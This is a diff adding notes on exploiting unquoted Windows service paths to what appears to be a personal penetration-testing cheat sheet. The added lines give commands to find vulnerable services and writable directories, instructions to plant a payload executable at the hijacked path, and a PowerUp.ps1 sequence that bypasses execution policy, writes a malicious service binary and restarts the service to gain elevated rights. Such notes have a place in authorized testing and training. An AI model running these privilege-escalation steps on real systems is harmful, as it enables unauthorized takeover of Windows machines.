@@ -138,6 +138,49 @@ compile it
 
 //replace the dll in the path of softw.
 
+#### unqueted service path
+```
+C:\Program Files\My Program\My Service\service.exe.
+
+When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+```
+
+//search for service with the PAth unqueted.
+```
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+```
+
+//then check for the path we have write priv, for 'C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe'
+```
+icacls "C:\"
+icacls "C:\Program Files"
+etc..
+```
+//check if we can start and stop the service
+`Start-Service GammaService`
+`BUILTIN\Users:(OI)(CI)(RX,W)`
+
+add the payload .exe file in hte path with the name of string before ' ' space.
+
+for creating .exe payload, refer to service hijacking.
+
+We can also use PowerUp.ps1 to do this:
+```
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-UnquotedService
+Write-ServiceBinary -Name 'xxxx' -Path "C:\xxxx\xx\xx\xx.exe"
+Restart-Service GammaService
+net user
+```
+
   #### Windows Privileges - SeBackup / SeRestore
     whoami /priv
       SeBackupPrivilege             Back up files and directories  Disabled
